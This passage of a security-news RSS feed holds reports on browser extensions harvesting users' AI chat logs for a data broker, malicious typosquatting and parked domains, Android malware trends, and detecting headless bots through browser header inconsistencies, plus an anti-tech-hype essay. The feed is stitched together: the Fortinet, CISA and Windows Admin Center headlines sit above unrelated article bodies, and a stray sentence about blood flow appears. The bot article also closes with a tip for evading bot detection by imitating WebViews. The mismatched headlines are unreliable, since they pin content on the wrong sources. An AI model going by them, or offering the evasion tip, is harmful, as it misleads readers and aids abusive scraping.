email with ChatGPT while simultaneously exfiltrating your entire conversation to a data broker.After documenting Urban VPN Proxy's behavior, we checked whether the same code existed elsewhere.It did. The identical AI harvesting functionality appears in seven other extensions from the same publisher, across both Chrome and Edge:Urban VPN Proxy - 6,000,000 users1ClickVPN Proxy - 600,000 usersUrban Browser Guard - 40,000 usersUrban Ad Blocker - 10,000 usersUrban VPN Proxy - 1,323,622 users1ClickVPN Proxy - 36,459 usersUrban Browser Guard - 12,624 usersUrban Ad Blocker - 6,476 usersTotal affected users: Over 8 million.The extensions span different product categories, a VPN, an ad blocker, a "browser guard" security tool, but share the same surveillance backend. Users installing an ad blocker have no reason to expect their Claude conversations are being harvested.All of these extensions carry "Featured" badges from their respective stores, except Urban Ad Blocker for Edge. These badges signal to users that the extensions have been reviewed and meet platform quality standards. For many users, a Featured badge is the difference between installing an extension and passing it by - it's an implicit endorsement from Google and Microsoft.Urban VPN is operated by Urban Cyber Security Inc., which is affiliated with BiScience (B.I Science (2009) Ltd.), a data broker company.This company has been on researchers' radar before. Security researchers Wladimir Palant and John Tuckner at Secure Annex have previously documented BiScience's data collection practices. Their research established that:BiScience collects clickstream data (browsing history) from millions of usersData is tied to persistent device identifiers, enabling re-identificationThe company provides an SDK to third-party extension developers to collect and sell user dataBiScience sells this data through products like AdClarity and Clickstream OSOur finding represents an expansion of this operation. BiScience has moved from collecting browsing history to harvesting complete AI conversations-a significantly more sensitive category of data.The privacy policy confirms the data flow:"We share the Web Browsing Data with our affiliated company... BiScience that uses this raw data and creates insights which are commercially used and shared with Business Partners"To be fair, Urban VPN does disclose some of this-if you know where to look. (shown during extension setup) mentions that the extension processes "ChatAI communication" along with "pages you visit" and "security signals." It states this is done "to provide these protections." goes further, buried deep in the document:"AI Inputs and Outputs. As part of the Browsing Data, we will collect the prompts and outputs queried by the End-User or generated by the AI chat provider, as applicable.""We also disclose the AI prompts for marketing analytics purposes."However, the Chrome Web Store listing-the place where users actually decide whether to install-shows a different picture:"This developer declares that your data is Not being sold to third parties, outside of the approved use cases"The listing mentions the extension handles "Web history" and "Website content." It says nothing about AI conversations specifically.The contradictions are significant:The consent prompt frames AI monitoring as protective. The privacy policy reveals the data is sold for marketing.The store listing says data isn't sold to third parties. The privacy policy describes sharing with BiScience, "Business Partners," and use for "marketing analytics."Users who installed before July 2025 never saw the updated consent prompt-the AI harvesting was added via silent update in version 5.5.0.Even users who see the consent prompt have no granular control. You can't accept the VPN but decline the AI harvesting. It's all or nothing.Nothing indicates to users that the data collection continues even when the VPN is disconnected and the AI protection feature is turned off. The harvesting runs silently in the background regardless of what features the user has enabled.Urban VPN Proxy carries Google's "Featured" badge on the Chrome Web Store. According to Google's documentation:"Featured extensions follow our technical best practices and meet a high standard of user experience and design.""Before it receives a Featured badge, the Chrome Web Store team must review each extension."This means a human at Google reviewed Urban VPN Proxy and concluded it met their standards. Either the review didn't examine the code that harvests conversations from Google's own AI product (Gemini), or it did and didn't consider this a problem.The Chrome Web Store's Limited Use policy explicitly prohibits "transferring or selling user data to third parties like advertising platforms, data brokers, or other information resellers." BiScience is, by its own description, a data broker.The extension remains live and featured as of this writing.Browser extensions occupy a unique position of trust. They run in the background, have broad access to your browsing activity, and auto-update without asking. When an extension promises privacy and security, users have little reason to suspect it's doing the opposite.What makes this case notable isn't just the scale - 8 million users - or the sensitivity of the data - complete AI conversations. It's that these extensions passed review, earned Featured badges, and remained live for months while harvesting some of the most personal data users generate online. The marketplaces designed to protect users instead gave these extensions their stamp of approval.If you have any of these extensions installed, uninstall them now. Assume any AI conversations you've had since July 2025 have been captured and shared with third parties.This writeup was authored by the research team at Koi.We built Koi to detect exactly these kinds of threats - extensions that slip past marketplace reviews and quietly exfiltrate sensitive data. Our risk engine, Wings, continuously monitors browser extensions to catch threats before they reach your team. to see how behavioral analysis catches what static review misses.Urban VPN Proxy: eppiocemhmnlbhjplcgkofciiegomconUrban Browser Guard: almalgbpmcfpdaopimbdchdliminoignUrban Ad Blocker: feflcgofneboehfdeebcfglbodaceghj1ClickVPN Proxy for Chrome: pphgdbgldlmicfdkhondlafkiomnelnkUrban VPN Proxy: nimlmejbmnecnaghgmbahmbaddhjbecgUrban Browser Guard: jckkfbfmofganecnnpfndfjifnimpcelUrban Ad Blocker: gcogpdjkkamgkakkjgeefgpcheonclca1ClickVPN Proxy for Edge: deopfbighgnpgfmhjeccdifdmhcjckoe]]></content:encoded></item><item><title>Fortinet FortiWeb Vulnerability (CVE-2025-64446) Exploited in the Wild for Full Admin Takeover</title><link>https://cybersecuritynews.com/fortinet-fortiweb-vulnerability-exploited/</link><author></author><category>security</category><pubDate>Tue, 16 Dec 2025 14:34:34 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[Fortinet FortiWeb Vulnerability (CVE-2025-64446) Exploited in the Wild for Full Admin Takeover

Image: Infoblox.When Internet users try to visit expired domain names or accidentally navigate to a lookalike “typosquatting” domain, they are typically brought to a placeholder page at a domain parking company that tries to monetize the wayward traffic by displaying links to a number of third-party websites that have paid to have their links shown.A decade ago, ending up at one of these parked domains came with a relatively small chance of being redirected to a malicious destination: In 2014, researchers found (PDF) that parked domains redirected users to malicious sites less than five percent of the time — regardless of whether the visitor clicked on any links at the parked page.But in a series of experiments over the past few months, researchers at the security firm  say they discovered the situation is now reversed, and that malicious content is by far the norm now for parked websites.“In large scale experiments, we found that over 90% of the time, visitors to a parked domain would be directed to illegal content, scams, scareware and anti-virus software subscriptions, or malware, as the ‘click’ was sold from the parking company to advertisers, who often resold that traffic to yet another party,” Infoblox researchers wrote in a paper published today.Infoblox found parked websites are benign if the visitor arrives at the site using a virtual private network (VPN), or else via a non-residential Internet address. For example,  customers who accidentally mistype the domain as  will see a normal parking page if they’re using a VPN, but will be redirected to a site that tries to foist scams, malware or other unwanted content if coming from a residential IP address. Again, this redirect happens just by visiting the misspelled domain with a mobile device or desktop computer that is using a residential IP address.According to Infoblox, the person or entity that owns scotaibank[.]com has a portfolio of nearly 3,000 lookalike domains, including , which demonstrably has been configured with its own mail server for accepting incoming email messages. Meaning, if you send an email to a Gmail user and accidentally omit the “l” from “gmail.com,” that missive doesn’t just disappear into the ether or produce a bounce reply: It goes straight to these scammers. The report notices this domain also has been leveraged in multiple recent business email compromise campaigns, using a lure indicating a failed payment with trojan malware attached.Infoblox found this particular domain holder (betrayed by a common DNS server — torresdns[.]com) has set up typosquatting domains targeting dozens of top Internet destinations, including , , , , , , , , and . A defanged list of these typosquatting domains is available here (the dots in the listed domains have been replaced with commas)., a threat researcher at Infoblox, said the parked pages send visitors through a chain of redirects, all while profiling the visitor’s system using IP geolocation, device fingerprinting, and cookies to determine where to redirect domain visitors.“It was often a chain of redirects — one or two domains outside the parking company — before threat arrives,” Brunsdon said. “Each time in the handoff the device is profiled again and again, before being passed off to a malicious domain or else a decoy page like Amazon.com or Alibaba.com if they decide it’s not worth targeting.”Brunsdon said domain parking services claim the search results they return on parked pages are designed to be relevant to their parked domains, but that almost none of this displayed content was related to the lookalike domain names they tested.Samples of redirection paths when visiting scotaibank dot com. Each branch includes a series of domains observed, including the color-coded landing page. Image: Infoblox.Infoblox said a different threat actor who owns  — a domain that differs from GoDaddy’s name servers by a single character — has long taken advantage of typos in DNS configurations to drive users to malicious websites. In recent months, however, Infoblox discovered the malicious redirect only happens when the query for the misconfigured domain comes from a visitor who is using Cloudflare’s DNS resolvers (1.1.1.1), and that all other visitors will get a page that refuses to load.The researchers found that even variations on well-known government domains are being targeted by malicious ad networks.“When one of our researchers tried to report a crime to the FBI’s Internet Crime Complaint Center (IC3), they accidentally visited ic3[.]org instead of ic3[.]gov,” the report notes. “Their phone was quickly redirected to a false ‘Drive Subscription Expired’ page. They were lucky to receive a scam; based on what we’ve learnt, they could just as easily receive an information stealer or trojan malware.”The Infoblox report emphasizes that the malicious activity they tracked is not attributed to any known party, noting that the domain parking or advertising platforms named in the study were not implicated in the malvertising they documented.However, the report concludes that while the parking companies claim to only work with top advertisers, the traffic to these domains was frequently sold to affiliate networks, who often resold the traffic to the point where the final advertiser had no business relationship with the parking companies.Infoblox also pointed out that recent policy changes by  may have inadvertently increased the risk to users from direct search abuse. Brunsdon said  previously defaulted to allowing their ads to be placed on parked pages, but that in early 2025 Google implemented a default setting that had their customers opt-out by default on presenting ads on parked domains — requiring the person running the ad to voluntarily go into their settings and turn on parking as a location.]]></content:encoded></item><item><title>CISA Adds Gladinet Crypto Flaw and Apple WebKit Zero-Days to KEV Catalog</title><link>https://thecyberthrone.in/2025/12/16/cisa-adds-gladinet-crypto-flaw-and-apple-webkit-zero-days-to-kev-catalog/</link><author></author><category>security</category><pubDate>Tue, 16 Dec 2025 14:07:13 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

The capabilities to steal one‑time passcodes are no longer experimental; they’re being rolled into campaigns at scale.The shift from nuisances to serious crimeLooking at 2024 as a whole, malware and PUPs together made up almost 90% of Android detections, with malware rising to about 43% of the total and potentially unwanted programs (PUPs) to 45%, while adware slid to around 12%.That mix tells an important story: Attackers are spending less effort on noisy annoyance apps and more on tools that can quietly harvest data, intercept messages, or open the door to full account takeover.But that’s not because adware and PUP numbers went down.Shahak Shalev, Head of AI and Scam Research at Malwarebytes pointed out: The holiday season may have just kicked off, but cybercriminals have been laying the groundwork for months for successful Android malware campaigns. In the second half of 2025, we observed a clear escalation in mobile threats. Adware volumes nearly doubled, driven by aggressive families like MobiDash, while PUP detections surged, suggesting attackers are experimenting with new delivery mechanisms. I urge everyone to stay vigilant over the holidays and not be tempted to click on sponsored ads, pop-ups or shop via social media. If an offer is too good to be true, it usually is.”  For years, Android/Adware.MobiDash has been one of the most common unwanted apps on Android. MobiDash comes as an adware software development kit (SDK) that developers (or repackagers) bolt onto regular apps to flood users with pop‑ups after a short delay. In 2025 it still shows up in our stats month after month, with thousands of detections under the MobiDash family alone.So, threats like MobiDash are far from gone, but they increasingly become background noise against more serious threats that now stand out.Over that same December–May versus June–November window, adware detections nearly doubled, PUP detections rose by about 75%, and malware detections grew by roughly 20%.In the adware group, MobiDash alone grew its monthly detection volume by more than 100% between early and late 2025, even as adware as a whole remained a minority share of Android threats. In just the last three months we measured, MobiDash activity surged by about 77%, with detections climbing steadily from September through November.A more organized approachRather than relying on delivering a single threat, we found cybercriminals are chaining components like droppers, spying modules, and banking payloads into flexible toolkits that can be mixed and matched per campaign.What makes this shift worrying is the breadth of what information stealers now collect. Beyond call logs and location, many samples are tuned to monitor messaging apps, browser activity, and financial interactions, creating detailed behavioral profiles that can be reused across multiple fraud schemes. As long as this data remains monetizable on underground markets, the incentive to keep these surveillance ecosystems running will only grow.“Just like phishing emails, phishing apps trick users into handing over their usernames, passwords, and two-factor authentication codes. Stolen credentials can be sold or used by cybercriminals to steal valuable information and access restricted resources.”Predatory finance apps like SpyLoan and Albiriox typically use social engineering (sometimes AI-supported) promising fast cash, low-interest loans, and minimal checks. Once installed, they harvest contacts, messages, and device identifiers, which can then be used for harassment, extortion, or cross‑platform identity abuse. Combined with access to SMS and notifications, that data lets operators watch victims juggle real debts, bank balances, and private conversations. One of the clearest examples of this more organized approach is Triada, a long-lived remote access Trojan (RAT) for Android. In our December 2024 through May 2025 data, Triada appeared at relatively low but persistent levels. Its detections then more than doubled in the June–November period, with a pronounced spike late in the year.Triada’s role is to give attackers a persistent foothold on the device: Once installed, it can help download or launch additional payloads, manipulate apps, and support on‑device fraud—exactly the kind of long‑term ‘infrastructure’ behavior that turns one‑off infections into ongoing operations.Seeing a legacy threat like Triada ramp up in the same period as newer banking malware underlines that 2025 is when long‑standing mobile tools and fresh fraud kits start paying off for attackers at the same time.If droppers, information stealers, and smishing are the scaffolding, banking Trojans are the cash register at the bottom of the funnel. Accessibility abuse, on‑device fraud, and live screen streaming, can make transactions happen inside the victim’s own banking session rather than on a cloned site. This approach sidesteps many defenses, such as device fingerprinting and some forms of multi-factor authentication (MFA). These shifts show up in the broader trend of our statistics, with more detections pointing to layered, end‑to‑end fraud pipelines.Compared to the 2024 baseline, where phishing‑capable Android apps and OTP stealers together made up only a small fraction of all Android detections, the 2025 data shows their share growing by tens of percentage points in some months, especially around major fraud seasons.What Android users should do nowAgainst this backdrop, Android users need to treat mobile security with the same seriousness as desktop and server environments. This bears repeating, as Malwarebytes research shows that people are 39% more likely to click a link on their phone than on their laptop. A few practical steps make a real difference:​Prefer official app stores, but do not trust them blindly. Scrutinize developer reputation, reviews, and install counts, especially for financial and “utility” apps that ask for sensitive permissions.​Be extremely cautious with permissions like SMS access, notification access, Accessibility, and “Display over other apps,” which show up again and again in infostealers, banking Trojans, and OTP-stealing campaigns.​​Avoid sideloading and gray‑market firmware unless absolutely necessary. When possible, choose devices with a clear update policy and apply security patches promptly.​Treat unexpected texts and messages—particularly those about payments, deliveries, or urgent account issues—as hostile until proven otherwise and never tap links or install apps directly from them.​​Run up-to-date real-time mobile security software that can detect malicious apps, block known bad links, and flag suspicious SMS activity before it turns into full account compromise.​Mobile threats in 2025 are no longer background noise or the exclusive domain of power users and enthusiasts. For many people, the phone is now the main attack surface—and the main gateway to their money, identity, and personal life.We don’t just report on phone security—we provide it]]></content:encoded></item><item><title>Windows Admin Center Vulnerability (CVE-2025-64669) Let Attackers Escalate Privileges</title><link>https://cybersecuritynews.com/windows-admin-center-vulnerability/</link><author></author><category>security</category><pubDate>Tue, 16 Dec 2025 13:57:30 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

Increased oxygen consumption – for instance in areas involved in calculation – did not coincide with the expected rise in blood flow.

A common approach is to "block" automated traffic with a JavaScript challenge, basically a small script that the browser must execute to prove it is a real client... Yes, this works well against primitive scrapers, but it no longer stops modern bot based on real browsers and human-like gestures. Tools like , , and  can execute the challenge inside a full Chromium instance, covering themself by disabling the classic navigator.webdriver = true flag. So, the idea of "My JavaScript code has been executed so the user must be human" stopped being reliable a long time ago.If you think this problem can be solved with a CAPTCHA the answer is NO! Damn, no. If you think so, you usually fall into one of two categories: The first one is not knowing that the most widely used CAPTCHAs can be solved automatically, and that entire "human solver" farms exist for the sole purpose of solving CAPTCHA on behalf of bots. There are well known services like , , , , and many others that deliver thousands of solved challenges per minute for a few cents. The second and the most important point is . Forcing users to solve a CAPTCHA every time they add an item to the cart or take an action during checkout it's a mess for the buying flow process. Imagine Amazon asking you to solve a puzzle at login, then again asking you many times to select all "Bus photos" when adding a product to your cart, and again when confirming the purchase. No serious e-commerce platform would accept that level of user interaction.The problem is that modern bots don't behave like stupid scripts (as you can imagine). Many of them uses full headless browsers, automate user interactions, and try to look as close as possible to a real user. But sometimes they expose themselves. Chromium in headless mode does not produce the same  as a "normal" browser, and the User Agent Client Hints are often incomplete, mismatched, or missing.Even today I see WAF rules like "let me check you User-Agent... oh yes, it start with Mozilla, you are a real browser!" this approach is not only stupid, but it's a waste of CPU for a website that receive millions of requests per hour. Anyway, why implementing client hints? Because the User-Agent header started as a simple information, then turned into a huge string full of details about browser, OS, device, and sometimes even patches and builds. That was useful for feature detection and compatibility, but it turned into a total fingerprinting disaster over time.To fix this, the Chromium team introduced User-Agent Client Hints (UA-CH). Instead of dumping everything into one opaque string, the browser exposes small, structured pieces of information through dedicated headers like Sec-CH-UA, Sec-CH-UA-Platform, Sec-CH-UA-Mobile, and their "high-entropy" variants for full version, architecture, model, and platform version. Modern Chrome started experimenting with this around 2015 under the "Client Hints" umbrella for things like DPR and viewport, and then extended the idea to user agent identity as part of the  plan that rolled out from 2020 in stable versions.Here come the cool part of having something like the UA client hints: by default, a Chromium based browser only exposes , such as a generic brand list and a major version (like 140 and not 140.1.2.3.4.5 etc...), hiding OS info and build details. If a site really needs more information, it can send an header called  response header with a list of client hints the website needs to do things. The browser can then decide to send richer hints on subsequent requests or not (usually it is totally transparent). This means that the first request comes to the website without client hints, and the all other requests comes with requested additional client hitns.Another cool thing: Let say that the website really needs client hints even for the first request, it can send the header  instead of or together with Accept-CH in order to make the browser internally reload the same page (with a 307 status) sending all required client hints. Provider like CloudFlare use this technique while sending their JavaScript Challenge (you can see them inspecting the response headers).Ok but what changes for defenders?From a security and detection perspective, this is interesting because a real browser keeps its  consistent across UA, Client Hints, and JavaScript APIs, while headless setups and bad bots often fail to do so. That is exactly why many protection systems today lean on Client Hints, not just for content variations, but to tell the difference between an actual browser running on a real device and a """script""" that is only pretending to be a real human.For example, while browsing this blog your Chrome would send:These values are sent by default and are part of the modern "low-entropy identity". As I said before, you can see that my browser just sent the main version "142" without details about the build in the Sec-Ch-Ua header.The cool thing is that, by reading CH and Sec-Fetch headers, I can say a lot about that request:it's a navigation started with a user actionthe user have entered the URL into the address barit's a top level navigation requesting a HTML documentthe user is on a macOS using Google Chrome 142the user is navigating from a desktop (not a mobile)the user is super smart because he/she read very interesting blog postSec-CH-UA: "Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: "macOS"
: This header contains the , a structured representation of the browser identity. Chrome normally exposes three entries: identifies the open-source engine the browser is built on. is the actual product name. is intentionally added as a "placeholder value". It exists only to prevent websites from strict parsing that list. The position of this value is random, could appear at the beginning or in the middle or at the end of the string.The version numbers match the major version of the browser, which ensures internal consistency across CH and the user-agent string. This tells the server whether the browser is running on a mobile form-factor () or not (). But, careful: this does  indicate if the OS is mobile or not, but it says if the browser prefers a mobile content. Chrome on macOS correctly returns  but Android can have this set to  when user requests a desktop version or on wide screen (and yes, this creates many funny edge cases in headless mode, where automation tools often get this wrong).Sec-CH-UA-Platform: "macOS" is the platform identity according to the Client Hints model. Chrome only exposes a short information of the OS, not the detailed version number (unless the server explicitly requests high-entropy hints).So, what can we do with those information? For example: an inconsistent combination like "macOS" + "?1" or "Android" + "Win64" is one of the easiest ways to spot automation tools or browser instrumentation.Last week I was digging into a traffic spike during a client's ticket drop... it was kind of funny seeing a bot claiming to be an iPhone 15 while its headers were screaming "I'm a Linux server in an AWS datacenter" lol 😄.Now, let's talk about Sec-Fetch-*Understanding the Sec-Fetch-* headersModern browsers expose a small set of request headers called Fetch Metadata Request Headers, introduced around 2019–2020 and gradually adopted across Chrome, Firefox, and (much, much later) Safari. These headers give the server contextual information about  a request was triggered, like "the user started this top level navigation by typing the URL in the address bar" and something like that... this is doable because your browser always knows whether a navigation came from a link click, from an embedded iframe, from a script fetch, or from opening a new tab, etc...Officially they were introduced for security check, trying to:Reduce CSRF and XS-Leaks attack surface by telling the server whether the request is cross-site, same-origin, or user-initiated, many attacks become easier to block.Enable server side enforcement based on navigation context a server can reject cross-site navigations to protected pages or block dangerous embedding.Expose subtle inconsistencies in headless automation these headers come from the browser’s internal navigation stack. Recreating them manually is difficult, and automation frameworks often leak inconsistencies.In the screenshot above we've:Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: none
Sec-Fetch-User: ?1
Here’s what each one means. describes the  of the request.  is what you expect when the browser loads a top-level HTML page. Here too, headless (or poorly-configured/stupid bots) often send "empty", "script", or omit the header entirely, which is an immediate red flag. indicates how the request was triggered.  is the mode for real page navigations: typing a URL, clicking a link, browser redirects. Automation tools often send "no-cors" or "cors" even when they pretend to "load a page". is one of the most interesting pieces.  means the request wasn’t initiated from another webpage. Typical cases include:a redirect initiated by the browser itselfThis is coherent for a first-page load. Many headless bots incorrectly say cross-site even on initial navigations... header is sent  when a real user gesture triggered the navigation (like clicking on something). It is  sent for fetch API calls, iframes, images, preloads, or passive navigations. This makes it one of the most reliable "human intent" signals in HTTP traffic. Bots often add it manually without reproducing the renderer state that would normally produce it, resulting in contradicting metadata.Why headless browsers expose identity inconsistencies?UA-CH and Sec-Fetch come from different parts of the "browser pipeline" and, under normal conditions, are internally consistent. A real browser has a rendering engine, a navigation context, a visible top level document, a frame tree, a full UA-CH pipeline, permissions policies and a dozen of other moving pieces that all agree on "where the request comes from" and "who the client claims to be".Despite what you may think, headless Chromium is way different from a "real" browser used by a human. When the browser runs without a graphical environment, several subsystems are disabled or partially stubbed. The identity layer becomes thinner, and some components that normally collaborate to generate Fetch Metadata and UA Client Hints simply do not run. This is exactly why you see missing Client Hints, or values that do not match the declared User Agent, or sec-fetch-site set to none even when the request originates from a navigation path that should produce same-origin or same-site.This is not speculation. The Chromium issue tracker show users reporting that headless Chrome fails to send Client Hints even though the JS environment inside the page can read them without any problems. One example is a bug report where developers noticed that in headless mode the CH headers are not present while the browser still exposes the correct data through JavaScript.There are also multiple community discussions from automation developers who discovered that headless Chrome behaves differently at the network layer. Some noticed that resources load in different order compared to headful Chrome, or that certain fetches fail only in headless mode. A Reddit thread even highlights that "headless Chrome doesn’t load content the same way normal Chrome does", which is another indirect symptom of the reduced identity and navigation context used in headless environments.Combine all this and you get a very predictable outcome: automation frameworks like Selenium, Puppeteer or Playwright, when running in true headless mode, generate requests that contain identity gaps. The User-Agent may claim , but the Client Hints announce a different major version, or they are missing entirely. The Fetch Metadata headers may describe a navigation that does not exist, or they may fall back to defaults that a real browser never produces in the same situation.These inconsistencies show how complex browser identity has become and how heavily it depends on the presence of a real rendering pipeline. For us as defenders that creates an excellent opportunity because they're hard for bot developers to fake.Real inconsistencies between headless and real browsersBelow are the inconsistencies that appear repeatedly in the wild on our Web Application & API Protection service logs.Sec-Fetch-Site "none" during an internal navigationOne of the most common inconsistencies is seeing  on requests that are clearly part of an internal site navigation. A real browser only sends "none" when the request originates from an address-bar navigation, a bookmark, an external protocol handler, or something happening outside the page context. In headless automation you often see none on XMLHttpRequest calls, form submissions, or follow-up navigations, simply because the browser lacks a proper top-level browsing context.Another clear inconsistency is when the UA claims "Linux" or "macOS" but the Client Hints say "Windows", or vice versa. We see a lot of requests with:UA: CH-UA-Platform: This cannot happen in a real graphical Chrome session. When Chromium runs headless or through automation layers, the UA can be freely spoofed, but the CH pipeline often falls back to defaults or reports the host OS instead of the spoofed one. That is why CH-UA-Platform exposes the truth even when the UA string is forged. This mismatch is one of the strongest detection signals because it is extremely difficult for bots to synchronize the whole identity stack consistently.Client Hints present but implausible browser versionsThis is a tricky one, we've a lot of requests where the UA claims  or , but the Client Hints report completely different versions (sometimes older, sometimes fixed values like v="24"). Real Chrome aligns the UA major version with Sec-CH-UA in a predictable way. Automation frameworks that override the UA or run patched builds often leave the CH values untouched. The result is something like:UA: CH-UA: "Chromium";v="100", "Google Chrome";v="100"This is not a pattern you ever see in legitimate user traffic. It is, however, extremely common in scraping frameworks and patched Chromium builds.Missing Client Hints on browsers that should send themA pattern we've seen many times: requests claiming Chrome 140+, 141+, 142+ but with  Client Hints at all. This is suspicious because Chrome has shipped UA-CH by default for a long time and always sends hints (browser brand, major version, platform, mobile flag, etc...) unless explicitly disabled. Headless Chrome and automation wrappers frequently fail to initialize the Client Hints subsystem or run in contexts where CH delegation does not activate.Sec-Fetch-Mode set to navigate on requests that are not navigationsMany of the request blocked by our WAAP include XHR or form POST requests marked as . This does not happen in real sessions. A normal browser only sets navigate for top-level or iframe navigations that load a document. When automation scripts programmatically calls , , or patched navigation flows, the fetch metadata env is not fully engaged, so the browser ends up misclassifying requests. These mismatches are very visible and cannot be easily controlled by the bad bot developer.One recurring inconsistency is a desktop-looking UA (Linux x86 or Windows NT 10) combined with Sec-CH-UA-Platform: "Android". A real Chrome instance cannot run in this configuration. Bots running inside Android emulators, nested virtual machines, or using patched Chromium forks often misreport the platform through CH because the automation layer exposes an Android user environment while the UA was manually spoofed to look like desktop. This mismatch is a definitive signal of non-human traffic.Sec-Fetch-Dest always set to document even for XHR or form POSTSome of our WAAP logs show  on XHR requests or asynchronous POST requests. A real browser uses  for XHR/fetch requests and reserves document for page loads. This is another symptom of navigation metadata not being correctly populated in headless mode. The destination is guessed generically rather than derived from an actual renderer.Requests that should include Sec-Fetch-User: ?1 but don’tThe  header appears only when a user gesture (click, tap) triggered a navigation. This is a classic automation signature: programmatic navigations (, ) simulate the effect of clicking, but not the user interaction itself. Real users generate more  tokens than bots.Yay! So we can now spot a lot of headless without false positive, right?ehm... ok, we've a problem called webview and maybe it is worth remembering what a WebView actually is. On Android,  is not a full standalone browser but an embeddable rendering component that apps use to display web content inside their own UI. On iOS the equivalent is . Both reuse the underlying rendering engine, but the navigation stack, header generation, UA composition and event pipeline are controlled by the host app, not by a real browser.If your detection rule says "modern Chrome without Client Hints looks like a bot", WebViews will trigger that rule constantly. Missing Sec-CH-UA, missing Sec-CH-UA-Platform, missing Sec-CH-UA-Mobile, and generally zero high-entropy hints are absolutely normal for WebViews. From a server perspective, that looks identical to a bot that spoofed a Chrome 142 UA without sending CH.This means a UA like Chrome/142.0.0.0 is  for WebView. If your rule thinks this is suspicious or "bot-like", you will get completely normal traffic misclassified as automation, and you don't want it... belive me, you don't 😄Fetch Metadata (the Sec-Fetch-* headers) is another area full of "edge cases". A WebView app often calls  directly or wires its own custom navigation delegate. These code paths bypass several browser-layer checks that normally populate Sec-Fetch-Site, Sec-Fetch-Mode, Sec-Fetch-Dest and Sec-Fetch-User. The result is that legitimate WebView traffic might:omit all Sec-Fetch-* headersalways send miss  even after a valid user gestureFrom a WAF point of view, this is indistinguishable from a headless browser (unfortunately).The X-Requested-With header is another shitty ambiguous header. Android WebView used to send it on , with the value being the app’s package name (I know... it doesn't make any sense, totally). This was meant as a sort of "WebView identification mechanism" but became a privacy issue (oh yes? really?). Many app developers now strip it or alter it... Google is gradually making it optional for privacy reasons, documented here: https://developer.android.com/privacy-and-security/changes/requested-withBecause of this, relying on X-Requested-With to flag WebViews or distinguish real clients from bots is unreliable: some apps send it, others remove it, others change it inconsistently.So, all this words just to say: are you a bad bot developer? Make your bad bot look exactly like a webview and nobody will block you 😄This post shows that modern bot detection is no longer about finding a single "bad signal". The User-Agent string alone is useless in this way, JavaScript execution is not a proof of a real user anymore, and even Client Hints, if analysed one by one, are not enough. What really matters today is the  of the whole browser identity.Client Hints and Fetch Metadata were introduced mainly for privacy and performance reasons, but in practice they describe a browser and how it behaves in a very structured way. This is an important lesson for anyone building detection rules: using a single signal, like "headless equals bot" or "User-Agent start with Mozilla, everything fine!", creates many false positives and, moreover, it's a completely waste of CPU especially with WebViews.UA, Client Hints, JavaScript-exposed entropy, and sec-fetch metadata together give you a single identity map and you can easily check if this map is coherent and decide if you want an incoherent browser on you websites.For large e-commerce platforms under automated abuse, this difference is critical. Blocking at the wrong level hurts real users and damages conversion rates. Understanding how browsers really identify themselves, and how automation fails to fully reproduce this identity, is the key to protecting high-value workflows without destroying the user experience.If you want to know more about how we do it, feel free to contact me.]]></content:encoded></item><item><title>This is not the future</title><link>https://blog.mathieui.net/this-is-not-the-future.html</link><author>ericdanielski</author><category>dev</category><pubDate>Tue, 16 Dec 2025 13:42:24 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[Modern technology is abusive.A small contingent of power users using niche OSes (like myself) survive by avoiding as much of the tech oligarchs’ world as I can, sure, but overall everything is disgusting, and using FOSS is certainly no silver bullet.Tech enthusiasts who do not apply critical thinking are even worse, because they get beat up everyday by the things they buy at a premium  because they have this twisted idea of what constitutes progress. This is slowly infusing into the general population, which is also a problem.People have been trained to be abused by software and by hardware, to ignore their needs, to accept any change as inevitable.
I speak of abuse because people have been trained to  and  change at the same time, with no agency whatsoever.Most old people in particular (sorry mom) have given up and resigned themselves to drift wherever their computing devices take them, because under the guise of convenience, everything is so hostile that there is no point trying to learn things, and dark patterns are everywhere.
Not being in control of course makes people endlessy frustrated, but at the same time trying to wrestle control from the parasites is an uphill battle that they expect to lose, with more frustration as a result.I want to emphasize here that there are good products (both software and hardware) on the market even though the list gets shorter every year,
some products even manage to solve real problems (!!).
That does not change the fact that consent, hype and projected consumer needs are manufactured by years and years of abuse and marketing campaigns.Those things were or are not inevitableInternet-connected beds are not inevitable.AI browsers are not inevitable.Talking to chatbots instead of public servants is not inevitable.Requiring a smartphone to exist in society is not inevitable.Unrepairable devices are not inevitable."AI-enhanced" vacation pictures are not inevitable.NFTs were not inevitable.The Metaverse was not inevitable.Your computer changing where things are on every update is not inevitable.Websites that require your ID are not inevitable.Garbage companies using refurbished plane engines to power their data centers is not inevitable.Juicero was not inevitable.Being on a platform owned by Meta is not inevitable.The Apple Vision pro was not inevitable."Copilot PCs" are not inevitable.Tiktok is not inevitable.Your computer sending screenshots to microsoft so they can train AIs on it is not inevitable.I could spend years filling this list up, because the tech grifters always find new ways to make us more miserable.Nothing is inevitable, nothing sold by powerful grifters is "the future" no matter how much they wish that were true.
Sure, some things can keep on existing, even for a very long time, even more if they have an untold number of billions - that they wormed their way into having by selling and exploiting personal data and attention -, but nobody has to be complicit. Some things might even end up existing because they are useful.But what is important to me is to keep the perspective of what consitutes a , and which actions get us closer or further from that.Every choice is  a  and a  based on the energy we can spend on the consequences of that choice.]]></content:encoded></item><item><title>JumpCloud Remote Assist Flaw Lets Users Gain Full Control of Company Devices</title><link>https://hackread.com/jumpcloud-remote-assist-flaw-full-devices-control/</link><author></author><category>security</category><pubDate>Tue, 16 Dec 2025 13:42:07 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

